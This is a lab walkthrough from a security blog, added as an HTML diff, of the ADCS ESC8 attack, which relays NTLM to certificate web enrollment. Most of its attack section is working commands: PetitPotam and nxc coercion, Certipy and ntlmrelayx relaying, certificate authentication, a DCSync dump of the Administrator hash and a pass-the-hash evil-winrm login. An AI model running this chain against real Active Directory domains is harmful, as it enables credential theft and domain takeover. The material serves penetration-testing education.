@@ -1,0 +1,221 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC8 – NTLM Relay to AD CS HTTP Endpoints</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/" rel="bookmark"><time class="entry-date published" datetime="2025-06-02T08:52:27+00:00">June 2, 2025</time><time class="updated" datetime="2025-06-19T13:22:55+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000"><strong>ESC8</strong> is a critical vulnerability in <strong><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/">Active Directory Certificate Services</a> (ADCS)</strong> that targets web enrollment interfaces, making them <strong>vulnerable</strong> to <strong>NTLM relay attacks</strong>. If <strong>HTTPS</strong> is not enforced and the <strong>Certificate Authority</strong> <strong>(CA)</strong> supports client authentication or domain computer enrollment templates, attackers can exploit this to <strong>impersonate</strong> users and escalate privileges. This attack can target any domain machine, including domain controllers, allowing attackers to silently gain higher privileges and further compromise the network. Proper configuration and security measures are essential to prevent <strong>ESC8 exploitation</strong>.</span></p>
+<h3><span style="color: #800000"> Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000"><strong>Overview the ESC8 Attack</strong></span></li>
+<li><span style="color: #000000"><strong>Prerequisites</strong></span></li>
+<li><span style="color: #000000"><strong>Lab Setup</strong></span></li>
+</ul>
+<p><span style="color: #000000"><strong>Enumeration &amp; Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000">Method 1: Using Certipy</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000">Interactive LDAP Shell as Domain Controller using Certipy</span></li>
+<li><span style="color: #000000">Method 2: Using Impacket-ntlmrelay</span></li>
+<li><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000">Overview the ESC8 Attack</span></h3>
+<p><span style="color: #000000"><strong>ESC8</strong> is a <strong>critical Active Directory escalation path</strong> that exploits <strong>misconfigured AD Certificate Services (ADCS) Web Enrollment</strong>, using NTLM relay and coercion to impersonate privileged accounts like Domain Admins. It’s a post-exploitation attack that leverages vulnerable certificate templates and CA settings to silently escalate privileges, without triggering security defenses, and doesn’t rely on malware or zero-day exploits.</span></p>
+<h4><span style="color: #000000">ADCS Web Enrollment Architecture</span></h4>
+<p><span style="color: #000000">Web Enrollment is an optional feature of ADCS that exposes an <strong>HTTP interface at </strong><strong>/certsrv</strong>, allowing users to:</span></p>
+<ul>
+<li><span style="color: #000000">Request new certificates via a browser</span></li>
+<li><span style="color: #000000">Renew existing ones</span></li>
+<li><span style="color: #000000">Download CA certificates or CRLs</span></li>
+</ul>
+<p><span style="color: #000000">While convenient for internal users and devices, this web portal becomes a <strong>serious vulnerability</strong> when:</span></p>
+<ul>
+<li><span style="color: #000000">It <strong>accepts NTLM authentication</strong> over HTTP</span></li>
+<li><span style="color: #000000">The CA allows <strong>enrollment using highly privileged templates</strong></span></li>
+<li><span style="color: #000000">There’s <strong>no protection against NTLM relay</strong></span></li>
+</ul>
+<h4><span style="color: #000000">How It Works:</span></h4>
+<ul>
+<li><span style="color: #000000">A user submits a certificate request via the web interface.</span></li>
+<li><span style="color: #000000">The CA checks the requester’s permissions and certificate template.</span></li>
+<li><span style="color: #000000">If approved, the CA signs and issues a valid certificate.</span></li>
+<li><span style="color: #000000">The user can then use the certificate for authentication (Kerberos/PKINIT) or for tasks like S/MIME, EFS, etc.</span></li>
+</ul>
+<p><span style="color: #000000"><em>Note: When <strong>NTLM authentication is allowed on the Web Enrollment page</strong>, it opens the door to <strong>NTLM relay attacks</strong>, especially if paired with<strong> coercion tools like PetitPotam</strong>.</em></span></p>
+<h4><span style="color: #000000">ADCS Servers Vulnerable to ESC8 Typically Meet These Conditions:</span></h4>
+<ul>
+<li><span style="color: #000000"><strong>Web Enrollment</strong> is enabled (http://192.168.1.10/certsrv/)</span></li>
+<li><span style="color: #000000">The <strong>Request Disposition</strong> on the certificate template is set to Issue (i.e., automatically approve requests)</span></li>
+<li><span style="color: #000000">The CA does <strong>not enforce strong requestor validation</strong> (e.g., no manager approval, no subject name restrictions)</span></li>
+</ul>
+<h3><span style="color: #800000">Prerequisite </span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory that supports PKINIT as DC1 and DC2.</span></li>
+<li><span style="color: #000000">Domain must have Active Directory Certificate Services and Certificate Authority configured and</span></li>
+<li><span style="color: #000000">DC2 with web enrollment enabled.</span></li>
+<li><span style="color: #000000">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000">Tools: Evil-Winrm, certipy-ad, nxc, PetitPotam</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup</span></h3>
+<p><span style="color: #000000">Before we jump into the attack walkthrough, make sure <strong>DC2 (the target server)</strong> has <strong>Active Directory Certificate Services (ADCS)</strong> installed with the <strong>Web Enrollment</strong> role enabled. This is <strong>critical</strong>, as ESC8 specifically abuses the /certsrv HTTP interface provided by this component.</span></p>
+<h5><span style="color: #000000"><strong>To install ADCS with Web Enrollment:</strong></span></h5>
+<ul>
+<li><span style="color: #000000">Firstly, open <strong>Server Manager &gt; Add Roles and Features</strong></span></li>
+</ul>
+<p><span style="color: #000000"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMmbjh5tXPal6jyccMSsh7JTobctex6UW9IeKDqEx37e-RuslgQdYuxb9keVzy3I5KeYnPIW1QPXT08QD0s8lrPqJIbZtWT0C9qIB42sPsp6vj1kjkz9lv8HtylImBTC71qXw1J6-F_mOBlw14rnwv0c_Sh48iofKVg4ggAL467y0uuXibPyKJRMWBddUd/s16000/1.png" alt="ADCS ESC8 NTLM Relay Attack" width="1167" height="830"/></span></p>
+<h5><strong><span style="color: #000000">Choose Installation Type</span></strong></h5>
+<ul>
+<li><span style="color: #000000">On the <strong>“Installation Type”</strong> screen, select:</span></li>
+<li><span style="color: #000000"><strong>Role-based or feature-based installation</strong></span></li>
+<li><span style="color: #000000">Click <strong>Next</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyp0Vnj9Z0lqIZ1h22AuTVjiPwYGkvEWoDVXQ0Ie5oUMwRLrFbFfBQFTjAXLiChcJELZQBRsTVR-Af3_0hzuEj-fz7LXs2g5TH5_I6ZuJm4icHqsWTFARbr5ItkQgz9JyRwa9ICoxAuwN6n8bMar5P3K0v1aN8TfZYH24ohOBotwaNAkBnoF9mipAULDf9/s16000/2.png"/></span></p>
+<h5><strong><span style="color: #000000">Select the Destination Server</span></strong></h5>
+<ul>
+<li><span style="color: #000000">Select your local server (<strong>ignite.local</strong>) from the list.</span></li>
+<li><span style="color: #000000">Click <strong>Next</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgj8rgyCUEvBJTc3zWMjnvCnEh-l1939ENDKbMto99iGDEtc_IbuMxiuMr2WxbbZdiDUwGsW_xQQSllRBY3jVN72KkNHWvLu-bsH71owpXv4x8991ZHKG4XTPs2xwbJG8QiKJ98r32lI_jFVbfvfIA3_Ugzd2JqnmTaOU_cqoLN8zN3j9X2sbYna45zkjmN/s16000/3.png" alt="ADCS ESC8 NTLM Relay Attack" width="1165" height="830"/></span></p>
+<h5><strong><span style="color: #000000">Select Server Roles</span></strong></h5>
+<ul>
+<li><span style="color: #000000">Scroll down and find: <strong>Active Directory Certificate Services</strong></span></li>
+<li><span style="color: #000000">A pop-up will appear to add dependencies.</span></li>
+<li><span style="color: #000000">Click <strong>Add Features</strong>, then click <strong>Next</strong>.</span></li>
+</ul>
+<p><span style="color: #000000">After choosing the ADCS role, you’ll be prompted to select which <strong>role services</strong> to install.</span></p>
+<p><span style="color: #000000">Check:</span></p>
+<ul>
+<li><span style="color: #000000">Certification Authority Web Enrollment</span></li>
+</ul>
+<p><span style="color: #000000"><em>Note:Web Enrollment is essential for ESC8 exploitation as it exposes the vulnerable HTTP interface.</em></span></p>
+<p><span style="color: #000000">Click <strong>Next</strong>.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaKipl3MQ3Argym7q-fYBbSRF4F2WMfOyfsLmi3WZWiOpJVCj9JNpO3nuoFlmLvFOUw5UDo8dwhyQgRT8FfTQ8Cyyp_vVFgxO-ytcfXd-oWvVIGJzuAvk6saREiimPwlXQtcikw4xCEnen3ruBEZl7smIUEZSooyZBL0npiDVppQCDqPs-Fhb5IGx4I5SK/s16000/4.png"/></span></p>
+<h5><strong><span style="color: #000000">Install Required Features</span></strong></h5>
+<ul>
+<li><span style="color: #000000">On the <strong>Features</strong> page, accept the defaults and click <strong>Next</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOBsG7tzx1IifVLnWa8gJJLnKwWwpEQEAKgz7wsfGSTnDqYPjlkyyiHoNzSsezmO29NcbRl5uof9UEcTl51Gr7JbVAwWKctMxo6x1s17r3PdtJliU35V_wp1_37T-iqbGUE8zhMjheymcB0ylO78iao0WqrdvEP7LmATdDFbPVvWpKBab5xmnDDxR77a5X/s16000/5.png" alt="ADCS ESC8 NTLM Relay Attack" width="1167" height="825"/></span></p>
+<h5><strong><span style="color: #000000">Confirm and Install</span></strong></h5>
+<ul>
+<li><span style="color: #000000">On the confirmation screen, review your selections.</span></li>
+<li><span style="color: #000000">Optional: Check the box to restart automatically if required.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVtPiRKtdl1B-zMRtIHql7cSgEjeuSlhXV47HYsIP_sYF-EdL0IT1ah9AczhhYOzyLCpAGy8kyN1ZE4ai8thrIdpP9xPgZd2TE_QLT5olEvhiBfahCMc9X0YS0MZT4cxfplcbRPip1-5Lqj5pG0bqQ2Hqg3p8jCCknmdHPuOLOQA78QAFkQA9ffYmOr0Xu/s16000/6.png"/></span></p>
+<ul>
+<li><span style="color: #000000">Then, click <strong>Install</strong> and wait for the installation to complete.</span></li>
+</ul>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidWqdR4ekvEeXa_xC9GXMizpR6W2YuUvhIQEr0i9dF_wg6-34_48_F9umEGA9IvVo2eXQDeRhwvUGaZPVqBq0ZC6pVn6E8c8BAkrIwTQZ8gM4Ef70Bpu3h63K1b_9EolZ76U4sLt76jSmnla6m0EYUqQVd-2WylfxqVUUItz6z-5sOQimMlwdc0m4-kehr/s16000/7.png" alt="ADCS ESC8 NTLM Relay Attack" width="1164" height="833"/></span></p>
+<h5><strong><span style="color: #000000">Now configure ADCS Post-Installation</span></strong></h5>
+<p><span style="color: #000000">Once the installation is complete, a yellow flag will appear in <strong>Server Manager</strong>.</span></p>
+<ul>
+<li><span style="color: #000000">Firstly, Click <strong>“Configure Active Directory Certificate Services on this server”</strong> to launch the <strong>Post-Deployment Configuration Wizard</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiexAn4B_c86hZsWrSPBuS3yXdWmR5fdztW7rRY1MTW_Ftx5UE89M1UYZFj4mv9hGKsDxDTbS2dEw6x95_MzM-cRK89COFbjl1qb4KapQ2JpHOJlQMAZGD2V5jxqtxEfQPw5bBA_kH6mDYeTAeHil4nu8bFtTYW8BXub2RNY215S0aB6ffeby3N_d91-wu4/s16000/8.png"/></span></p>
+<p><span style="color: #000000">In the wizard:</span></p>
+<ul>
+<li><span style="color: #000000">Then, Choose the <strong>current user</strong> if they are a Domain Admin (Administrator in this case).</span></li>
+</ul>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiIZz5Xj1uHSLWa-5md5zDMSmn_cego2F3R9LC4ZiHYqYkUD_OTzvN5hsylfxBKyRMnQjqROv9OWjLxjA5wSUz78lXyFAEHIYttRS2CzUaOCIVvzz4Blp5vFwlITp2nukzWkdgtQJuF5QB2eRWEtWphVAFV7nhTDrypOyIYdStHbt2MuS4LKwQX5bbltIN/s16000/9.png" alt="ADCS ESC8 NTLM Relay Attack" width="1134" height="830"/></span></p>
+<h5><strong><span style="color: #000000">Select the following roles to configure:</span></strong></h5>
+<ul>
+<li><span style="color: #000000"><strong>Certification Authority Web Enrollment</strong></span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjUCxXELxi0N67LHwFrn9tVFBjXY5K94zeDNOFNfQB1DnxT5m49r7R-HWrh0qdmKfKUHX3dliyB0GJutkf5BguXYLbMpq3eEmATRadIEAkW-KQwjgT6wmR6ZjoAs1KwEYDarZzpVn4tskJzOOMDYHY1lTdq2ELf1cvpoEV9TmWGG6JGX29mzLAgh0lm8Fym/s16000/10.png"/></span></p>
+<ul>
+<li><span style="color: #000000">Then, Confirm installation path and click <strong>Configure</strong>.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBbbLEf4Sy8bjHcODcc0dJN6GSMz808wkWirZUpvvyMw-zjIyLV5KTAF7PcDlgeiYqGppEWc5mIIFdhysPpZI2_MkJr1XwZvIap-EZ8y57gHusCI7ioKzQdqQCyBLvXKo6uSr8OlHlgQDUlw0DjrH7hKfPFUKVAQz0H5PC3eN1Qnt89nIFlJC2tGXV5MhA/s16000/11.png"/></span></p>
+<h5><strong><span style="color: #000000">On the result screen:</span></strong></h5>
+<ul>
+<li><span style="color: #000000">If the setup is correct, you will see “Configuration Succeeded.”</span></li>
+<li><span style="color: #000000">Click <strong>Close</strong></span></li>
+</ul>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjEZR3tZV3uPib-5YPE28n-gcRMt-Lc9Zu-IbxzZhjjgnxp7aImMHzuA9RmQdBRYNf4uOSa4P9zgkjo0MqAcvJzLqOsR-9zni3kRDNMHN0r37fftfn1Q_zz_xEwUcBA9jWOtk6IuUIP6Q6kYHiM5Car2q1UW-6cs4yG36ToW93PsPzTXK7v7a9Ts637HYdf/s16000/12.png" alt="ADCS ESC8 NTLM Relay Attack" width="1118" height="830"/></span></p>
+<p><span style="color: #000000">When successful, you should be able to browse to: http://192.168.1.10/certsrv</span></p>
+<p><span style="color: #000000">Now that our target environment is properly configured, let’s jump into the <strong>attack walkthrough</strong>.</span></p>
+<h3><span style="color: #000000"><span style="color: #800000">Enumeration &amp; Exploitation</span> </span></h3>
+<h4><span style="color: #800000">Method 1 : Using Certipy</span></h4>
+<p><span style="color: #000000">This Identify exploitable certificate templates, coerce a domain controller, capture a forged certificate via Certipy relay, and use it for authentication.</span></p>
+<h4><span style="color: #000000">Find Vulnerable Templates with Certipy</span></h4>
+<p><span style="color: #000000">With credentials for a regular domain user (raj@ignite.local), use Certipy to find templates that allow abuse:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy find -u raj@ignite.local -p 'Password@1' -dc-ip 192.168.1.4 -vulnerable -enabled</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUylkkMNjbOd3ErsOr14oOqiRqWsSwmTfXHsnFdNMztbSaNa-C85cV3vLAxNUXoCSbHJu-BL1Ac2s9MlYICswUrMyrB2QKLxQr8fXStSi_ziWZl-n-qTk4vchXz4nkwNAbQirvb0-SeF155uWQ7bZdx5RlHmCYrWC__efxqmSuTaXsAnD7zrVhHXJEF8sM/s16000/13.png"/></span></p>
+<p><span style="color: #000000">The command queries AD CS to list enabled templates, identify vulnerabilities, and assess configurations like Template with DomainController EKU,  <strong>auto-issue enabled</strong>, and <strong>enrollable by low-privileged users</strong>, combined with <strong>Web Enrollment enabled on the CA</strong>.</span></p>
+<p><span style="color: #000000">Let’s read the content saved in a <strong>.txt</strong> or <strong>.json</strong> file format.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgr6aHDE5I563H2sxQox9gM1CF-mIoarxBf4uSSGoT1nmjEC9Ky4bxWGyMbEHCYm-0pHDiKRP5Wy9f8ua67tU0BARVLES7Uc7XVS2CV7bdDVcGIJXj0Bn8vLi4JFoo9r55z6zCcwFsKwIVpd-FhgAGGS2f8fb80CwaEOwHJauAQDjW3PeQYVzR6wml64REV/s16000/14.png" alt="ADCS ESC8 NTLM Relay Attack" width="1304" height="676"/></span></p>
+<p><span style="color: #000000"><strong>Note:</strong> If Web Enrollment is enabled without approval or identity validation requirements, the setup is vulnerable to ESC8.</span></p>
+<h4><span style="color: #000000">Start Certipy Relay to the CA</span></h4>
+<p><span style="color: #000000">On Kali, set up Certipy to listen and relay incoming NTLM traffic to the CA:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad relay -target 192.168.1.10 -template DomainController</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhLWP3hzJRtQTGy9Kdh1Vac2YlIpqO35ZBrvJFILxKMKy4KBaobbUqrmH_wG4tCFWf6ufpzWDZRkgRi3WOGKwQyUrYH_BSfErH9LkXIjvwgW-xszHPPJct0ZKsd2kq2B4lgPDEefwtE_GtMUp9a75K2XLHVvqKNCAW12Yqn2BbKT-gDyDRBtrPYV872cX_a/s16000/15.png"/></span></p>
+<h4><span style="color: #000000">Coerce Authentication from DC1 (PetitPotam)</span></h4>
+<p><span style="color: #000000">Use <strong>PetitPotam</strong> to force DC1 to authenticate to our Kali listener:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python PetitPotam.py -u raj -p Password@1 192.168.1.11 192.168.1.4</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZAHCPIZ1G2xnYR1aFpp6VlX9cYjCNc9T4_H3AwaqtEY0gsXBx1ioUvcCgW5AKwIp1jwYRtBWFnNAKZwb_Wsm3dRMdau8Nd_QEnUqllsO32W3s_EflC1dg48De-8vpoSdgKrzJhI2BuHJ0vH2QYuO3mDaaGKHBYmn2iEwuhg07SxqPizbseI7Ehyphenhyphenxge1zo/s16000/16.png" alt="ADCS ESC8 NTLM Relay Attack" width="1112" height="694"/></span></p>
+<p><span style="color: #000000">What happened?</span></p>
+<p><span style="color: #000000">We exploit PetitPotam through MS-EFSRPC to trick DC1 into sending an NTLM authentication token to us. We then use Certipy to relay it to the CA and request a certificate for DC1$.</span></p>
+<p><span style="color: #000000"><strong><em>Note:</em></strong><em> This is the core of the ESC8 attack chain, coercion + relay = impersonation.</em></span></p>
+<h4><span style="color: #000000">Relay and Receive Certificate for DC1$</span></h4>
+<p><span style="color: #000000">After triggering authentication from DC1 via PetitPotam, the NTLM credentials are relayed to the ADCS Web Enrollment interface (http://192.168.1.10/certsrv), submitting a request using the DomainController template for DC1.</span></p>
+<p><span style="color: #000000">In short, Certipy relays DC1’s authentication to the CA and <strong>requests a certificate impersonating DC1$</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad relay -target 192.168.1.10 -template DomainController</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYmFChrWPWHNBkifNPqcrXdjY2Dsz9uAxey8I6iCA1HzAh27Coi-svNaPJmWWo9-m42OcE0WRIIwC4ptBenpjP8KXtskQhaOl3H2BSlfpLV1JiEtbCg9tjOMMBtMSU-oJXKq5XlyDf0qzHV_V0kJmCbZ8JxUZwPWznSaSFY81vyqryGdU5zOf-A52cyo9b/s16000/17.png"/></span></p>
+<p><span style="color: #000000">we now have a .pfx file that lets us to <strong>authenticate as the domain controller (DC1$)</strong>.</span></p>
+<h4><span style="color: #000000">Authenticate Using Issued Certificate</span></h4>
+<p><span style="color: #000000">Certipy outputs a .pfx file for the DC1$ account. Use it to authenticate:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx DC.pfx -dc-ip 192.168.1.4</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTFUzoRP7h2pfvYOeWnZjDTWg5xvztqk3GX9ItKTyZg8yBFMuhmtHlQHN-8dXkSGmvmV7Z5-oNDQboSA9idHX6K6ncRu4E5M80uj4PFxWjh7Z9Y6KL8Fk4luEnvNlgCKyJ0J0_x4MxTvdFBWCgDKNo2pzdins_i8K0kQcObFdgs_tIK-_SXp3lNEqvwlVH/s16000/18.png" alt="ADCS ESC8 NTLM Relay Attack" width="1259" height="252"/></span></p>
+<p><span style="color: #000000">We now hold a <strong>NTLM hash for  DC1$</strong>.</span></p>
+<h3><span style="color: #800000">Post Exploitation</span></h3>
+<h4><span style="color: #800000">Interactive LDAP Shell as Domain Controller Using Certipy</span></h4>
+<p><span style="color: #000000">This uses the dc1.pfx certificate to authenticate to the domain controller via Kerberos, granting access to an interactive LDAP shell as the DC1$ machine account.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx dc1.pfx -dc-ip 192.168.1.4 -ldap-shell</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQf7ueWM_jiCSfAJ1Fngq6AIoBOD2zYBBRcbfFkhdEJ92q-4fnbE1OxovqDgLLAOZox2cTUVOW-OBxC9B8amZMBpHiD-O_9CPCKdv8CHBhPFcYbn4lGPcD6vV98z-bmowwTgx2kkR___Ou8dDPGq2oghhLKQH9juMlh35wMsLd9EEk180TwEMHRgKq37Go/s16000/19.png"/></span></p>
+<p><span style="color: #000000"><strong>Note:</strong> We’re not simulating or spoofing; we’re authenticating as a trusted machine account with a legitimate, CA-signed certificate, giving us native, protocol-level access to Active Directory through the LDAP shell.</span></p>
+<h4><span style="color: #800000">Method 2: Using Impacket-NTLMRelayx</span></h4>
+<p><span style="color: #000000">This shows another toolchain and replicates the <strong>same logic</strong>, coercion + relay + certificate = impersonation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-ntlmrelayx  -t http://192.168.1.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdJottL0yP2-oubH5m_kPBprZZNGl6VHuxkCD1zPFio6IAl0isDd7pS3TxN8hCNVjw7kfsqM4gKrzbI-pThTJwe1Hl7xSd4OPk30MtN-hW4gSHWDRLZNipfI5tXA8t5lTG3kPZx8qR3C9qtpnWjBGa-TzDD3k013C4-s1LnnsNwdBQGzxvub5gTunbTHdV/s16000/20.png" alt="ADCS ESC8 NTLM Relay Attack" width="1524" height="611"/></span></p>
+<p><span style="color: #000000">First, it relays incoming SMB authentication to the Web Enrollment interface on DC2. Then, it automatically requests a certificate using the DomainController template. Finally, upon success, it stores the certificate and key for later use.</span></p>
+<h4><span style="color: #000000">Coerce DC1 to Authenticate with nxc</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.4 -u raj@ignite.local -p Password@1 -d ignite.local -M coerce_plus -o LISTENER=192.168.1.11</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLCa5eKeAuSoG91UUxRYJpPyP3EyyBa2l8yiuFqq4OIJwmQFSiLjdjUOhV49_D9koaxFPTwWJTVuxDI3gTa22CpT6n5w_dviKHGymCFscU3LrEYkqcaczakqO2BqNkevUTF0h_dftLWRp95VwEWQNo6zWkCXZKpS5oTixDEiH7yJmkBXTHZ4dGcf4NUqxl/s16000/21.png"/></span></p>
+<p><span style="color: #000000">This command targets DC1, forces an SMB authentication attempt to the relay listener on Kali, and uses the coerce_plus method triggered via common coercion protocols like MS-EFSRPC and MS-RPRN.</span></p>
+<p><span style="color: #000000"><em>Note:</em><em> Relay captures this and issues a <strong>certificate for DC1$</strong>, which you can convert into a </em><em>.pfx</em><em> file if needed.</em></span></p>
+<h4><span style="color: #000000">Certificate Issued and Saved via ntlmrelayx</span></h4>
+<p><span style="color: #000000">After running the NTLM relay and successfully coercing DC1 using nxc, the output will look something like this:</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-q1t1IhyDAM1Fv_tdKrPq6QSUUq5HAQ_d_Qvwb4lid6MKC9AFlcKZ1VRQSpuuTvz703og13Sqfr94TtVfsYADEiGQFkWANrUxS7Y6XHEdMMidJvnHp_3GjjGTx0E1DBrMbUTOIzqQVZuJ9rgW522qqexbehqLQNiPd9Zo6hzdzJcJ7o5X3gE10Ptrk6G9/s16000/22.png" alt="ADCS ESC8 NTLM Relay Attack" width="794" height="434"/></span></p>
+<p><span style="color: #000000">This output confirms that the <strong>relay was successful</strong> and the CA issued a <strong>PKCS#12 certificate</strong>, which is saved as: DC1$.pfx</span></p>
+<h4><span style="color: #000000">Authenticate as DC1$ with Issued Certificate</span></h4>
+<p><span style="color: #000000">We use the issued certificate for DC1$ to authenticate over SMB to DC2, effectively impersonating the domain controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.10 --pfx-cert dc1.pfx -u "dc1$"</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi90WN77fr4JIyjrs1vGXhhDZUgC-YTGlnDK08qKXb4LGuSEEsE9_h_3OqQ4TV3t2K35PAhieBtVOirrHGpnJJhPmXQyXVly2AySr8xIDGWJKF1siiJH9ctx_Py504gesmI5WoihagqnGXHDjJ2uv9kcMVs8l-amp_uLQa1SOS6lZXVU_eGUPt66WtTOrmW/s16000/23.png" alt="ADCS ESC8 NTLM Relay Attack" width="1319" height="125"/></span></p>
+<h4><span style="color: #000000">Extract Administrator Hash with DCSync</span></h4>
+<p><span style="color: #000000">We perform DCSync as DC1 to extract the NTLM hash of the Administrator account.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.10 --pfx-cert dc1.pfx -u "dc1$" --ntds --user Administrator</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjurZQz1kk9EwmRN0PfLPsFHK1a3geGWKTeqAAclvi-hgBFMszdPx9TFs3icG3x7-e6ogCjGYW_KPDbD4x4XUK-bVByUk1W2Vhjd9lUWD1GtyIkSJRli8t2y8d8Qat9JlSyC8iiITZJ_zU8dDiGYBSL4RhaKq5W350HQ1b2ntoBAgnFktcQi86dM4-COG9I/s16000/24.png"/></span></p>
+<h4><span style="color: #800000">Lateral Movement &amp; Privilege Escalation using Evil-Winrm</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.4 -u administrator -H 32196b56ffe6f45e294117b91a83bf38</pre>
